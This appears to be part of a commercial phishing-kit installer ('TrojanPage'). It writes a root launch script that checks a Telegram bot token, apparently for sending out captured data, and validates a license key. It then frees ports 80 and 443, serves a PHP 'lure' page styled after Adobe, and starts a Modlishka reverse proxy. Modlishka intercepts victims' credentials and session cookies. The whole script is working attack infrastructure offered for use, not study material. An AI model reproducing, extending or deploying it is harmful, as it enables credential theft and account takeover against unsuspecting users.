# --- 6. CREATE THE PERMANENT RUN SCRIPT (YAML INTERFACE EDITION) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
# --- SETTINGS ---
MASTER_KEY="TROJAN-PRO-2026"
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'
CONFIG_FILE="/root/config.json"
LICENSE_FILE="/root/.license"

# --- 1. THE TROJANPAGE HEADER ---
clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM DASHBOARD ]${NC}"
echo " ----------------------------------------------------------------------------------"

# --- 2. CHECK IF ACTIVATED & CONFIGURED ---
if [ -f "$CONFIG_FILE" ] && [ -f "$LICENSE_FILE" ]; then
    # QUICK HEALTH CHECK
    echo -ne "[+] Checking Telegram API..."
    TG_TOKEN=$(grep -oP '(?<="telegramToken": ")[^"]*' $CONFIG_FILE)
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} ONLINE${NC}"
    else
        echo -e "${RED} OFFLINE (Check Token)${NC}"
    fi

    echo -ne "[+] Checking Database..."
    if pgrep -x "mongod" > /dev/null || [[ $(grep "mongodb+srv" $CONFIG_FILE) ]]; then
        echo -e "${GREEN} CONNECTED${NC}"
    else
        echo -e "${RED} DISCONNECTED${NC}"
    fi

    echo " ----------------------------------------------------------------------------------"
    echo -e "${BLUE}[!] Launching YAML Interface...${NC}"
    sleep 1

    # --- 3. START THE ENGINES ---
    # Kill old sessions to prevent port conflicts
    sudo fuser -k 80/tcp 443/tcp 2>/dev/null
    pkill proxy && pkill php

    # Launch PHP Lure (Your GUI)
    screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
    
    # Launch The Core Engine (Modlishka/Trojan)
    # This will display your YAML/Interactive terminal
    cd /root/engine/dist/
    ./proxy -config /root/config.json
    
    exit 0
fi

# --- 4. FALLBACK: IF NOT INSTALLED, TRIGGER SETUP ---
echo -e "${RED}[!] System not configured. Please run deploy.sh first.${NC}"
exit 1
EOF
chmod +x /root/run.sh
